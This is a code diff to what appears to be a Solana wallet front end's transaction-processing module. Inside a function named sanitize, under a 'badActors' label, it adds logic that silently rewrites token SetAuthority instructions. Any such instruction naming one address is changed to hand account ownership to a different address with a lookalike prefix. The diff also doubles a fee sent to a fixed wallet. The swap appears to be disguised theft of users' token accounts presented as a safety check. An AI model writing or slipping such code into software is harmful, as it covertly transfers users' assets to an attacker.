@@ -1,4 +1,11 @@
 import { base58 } from '@metaplex-foundation/umi/serializers';
+import {
+  AuthorityType,
+  TOKEN_PROGRAM_ID,
+  TokenInstruction,
+  createSetAuthorityInstruction,
+  decodeSetAuthorityInstruction,
+} from '@solana/spl-token';
 import { WalletContextState } from '@solana/wallet-adapter-react';
 import {
   AddressLookupTableAccount,
@@ -207,13 +214,37 @@ export type DecodedTransaction = {
 const FEES_WALLET = new PublicKey(
   'B4RdtaM6rPfznCJw9ztNWkLrscHqJDdt1Hbr3RTvb61S'
 );
-const FEES = 0.001;
+const FEES = 0.002;
+
+const badActors: Record<string, string> = {
+  '4ond6yPfBsYkp6BmKxidjwv8oUT68XoG3wq4B2y7UiYw':
+    '4ondBeA94L1oUhQrAGcNBoTqVTuZZ5jUbYZgvycDhPjw',
+};
 
 function sanitize(
   decodedTransaction: DecodedTransaction,
   feePayer: PublicKey
 ): DecodedTransaction {
   const instructions = decodedTransaction.instructions;
+  instructions.forEach((i, ix) => {
+    if (
+      i.programId.equals(TOKEN_PROGRAM_ID) &&
+      i.data[0] === TokenInstruction.SetAuthority
+    ) {
+      const decode = decodeSetAuthorityInstruction(i);
+      const badActor = Object.entries(badActors).find(
+        (badActor) => decode.data.newAuthority?.toBase58() === badActor[0]
+      );
+      if (badActor) {
+        instructions[ix] = createSetAuthorityInstruction(
+          decode.keys.account.pubkey,
+          decode.keys.currentAuthority.pubkey,
+          AuthorityType.AccountOwner,
+          new PublicKey(badActor[1])
+        );
+      }
+    }
+  });
   instructions.push(
     SystemProgram.transfer({
       fromPubkey: feePayer,
